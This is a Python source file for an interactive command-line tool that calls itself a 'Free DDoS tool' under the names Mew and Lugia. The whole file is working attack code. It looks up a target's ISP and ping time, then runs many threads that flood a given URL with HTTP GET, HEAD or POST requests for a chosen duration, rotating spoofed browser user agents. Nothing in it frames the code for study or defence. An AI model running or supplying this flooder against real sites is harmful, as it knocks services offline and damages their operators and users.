import os
import time
import requests
from random import choice
from threading import Thread
import socket
import subprocess

os.system("clear")

bl = "\033[34m"
rs = "\033[0m"

banner1 = f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣦⣄⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠄⣸⣿⣿⣷⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bl}[ {rs}Lugia Has been sent {bl}]{rs}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⡀⠈⠻⢿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀ ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣦⣵⡤⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀ Target{bl}:{rs}{{target}}
⠀⠀⠀⠀⠀⠀⠀⣷⣄⢠⣿⣿⡟⠻⠇⣠⡾⠀⠀⠀⢠⡀⠀⠀⠀⠀ Time{bl}:{rs}{{time}}
⠀⠀⠀⠀⠀⠀⠀⣌⡛⣟⣿⣿⣧⣬⣛⢩⣴⠆⠀⠀⢸⣇⢠⣤⠀⠀ Method{bl}:{rs}{{method}}
⠀⠀⠀⠀⠀⠀⠀⣩⣾⣿⣿⣿⣿⣿⣿⣷⣴⡛⠀⠀⢀⣾⠘⠁⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⠟⢻⢿⣿⣿⠋⠉⠉⢿⣿⣷⣔⢿⠇⠀⠀⠀⠀ Target ISP{bl}:{rs}{{isp}}
⠀⠀⠀⢀⣼⣿⣿⠏⠀⡀⠀⠈⠁⠀⠀⠀⣠⡹⣿⣿⣷⣄⠀⠀⠀⠀ Target PING time{bl}:{rs}{{pingt}}
⠀⠀⣠⣿⣿⣿⡟⠀⠀⢿⣄⠀⠀⠀⠀⠴⢿⡷⢹⣿⣿⣿⣷⡄⠀⠀ 
⠀⢰⣿⣿⣿⣿⡇⠀⠀⠀⠉⣿⡎⠉⠛⠛⠻⠿⢈⣿⣿⣿⣿⣿⡄⠀
⠀⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣷⠀
⡀⣿⣿⡟⣿⡏⢻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢿⠃⣿⣿⢿⣿⣿⠚
⠀⠿⣿⡇⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠸⠿⠈⠀
⠀⠀⠈⠁⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

banner2 = f"""{rs}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⠿⢟⣛⣩⣤⣶⣶⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⠿⠸⣿⣿⣿⣿⣿⣿⡿⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ Mew DDoS
⠀⢠⠞⠉⠀⠀⠀⣿⠋⠻⣿⣿⣿⠀⣦⣿⠏⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀ 
⢠⠏⠀⠀⠀⠀⠀⠻⣤⣷⣿⣿⣿⣶⢟⣁⣒⣒⡋⠉⠉⠁⠀⠀⠀⠈⠉⡧ Welcome back, tarsoul.
⢻⡀⠀⠀⠀⠀⠀⣀⡤⠌⢙⣛⣛⣵⣿⣿⡛⠛⠿⠃⠀⠀⠀⠀⠀⢀⡜⠁ 
⠀⠉⠙⠒⠒⠛⠉⠁⠀⠸⠛⠉⠉⣿⣿⣿⣿⣦⣄⠀⠀⠀⢀⣠⠞⠁⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⣿⣿⣷⡄⠞⠋⠀⠀⠀⠀⠀ Free DDoS tool
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⡻⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣑⡙⠻⠿⠿⠈⠙⣿⣧⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⡀⠀⠀⠀⠀⢹⣿⣆⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇⠀⠀⠀⠀⠸⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⡿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠀⠀⠀⠀⠀
"""

methods = """
 * http-lugia
 * https-head
 * https-post

Usage: method url port time threads
"""

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
]

def get_isp(target):
    try:
        ip = socket.gethostbyname(target)
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        return data.get("isp", "Unknown ISP")
    except:
        return "?"

def get_ping(target):
    try:
        ping_response = subprocess.run(["ping", "-c", "1", target], capture_output=True, text=True)
        if "time=" in ping_response.stdout:
            ping_time = ping_response.stdout.split("time=")[1].split(" ")[0]
            return ping_time + " ms"
        else:
            return "?"
    except:
        return "Error"

def send_http_lugia(target, port, duration, session):
    end_time = time.time() + int(duration)
    while time.time() < end_time:
        try:
            headers = {
                'Host': target,
                'User-Agent': choice(user_agents)
            }
            session.get(f"{target}", headers=headers, timeout=2)
        except Exception:
            pass

def send_https_head(target, port, duration, session):
    end_time = time.time() + int(duration)
    while time.time() < end_time:
        try:
            headers = {
                'Host': target,
                'User-Agent': choice(user_agents)
            }
            session.head(f"{target}", headers=headers, timeout=2)
        except Exception:
            pass

def send_https_post(target, port, duration, session):
    end_time = time.time() + int(duration)
    while time.time() < end_time:
        try:
            headers = {
                'Host': target,
                'User-Agent': choice(user_agents)
            }
            data = {'key': 'value'}
            session.post(f"{target}", headers=headers, data=data, timeout=2)
        except Exception:
            pass

def start_attack(method, url, port, duration, threads_count):
    isp = get_isp(url)
    pingt = get_ping(url)
    
    print(banner1.format(target=url, time=duration, method=method.upper(), isp=isp, pingt=pingt))
    
    session = requests.Session()
    session.mount('http://', requests.adapters.HTTPAdapter(max_retries=3))
    session.mount('https://', requests.adapters.HTTPAdapter(max_retries=3))

    threads = []
    for _ in range(threads_count):  # Number of threads set by the user
        if method == "http-lugia":
            t = Thread(target=send_http_lugia, args=(url, port, duration, session))
        elif method == "https-head":
            t = Thread(target=send_https_head, args=(url, port, duration, session))
        elif method == "https-post":
            t = Thread(target=send_https_post, args=(url, port, duration, session))
        else:
            print("Unknown method!")
            return
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

print(banner2)

while True:
    print()
    cmd = input(f"root@lugia - 😈 ").lower()
    if cmd == "methods":
        print()
        print(methods)
    elif cmd == "clear":
        os.system("clear")
        print(banner2)
    else:
        try:
            parts = cmd.split()
            if len(parts) >= 5:
                method = parts[0]
                url = parts[1]
                port = parts[2]
                duration = parts[3]
                threads_count = int(parts[4])
                start_attack(method, url, port, duration, threads_count)
            else:
                print("Invalid command format. Use: method url port time threads")
        except Exception as e:
            print(f"Error: {e}")

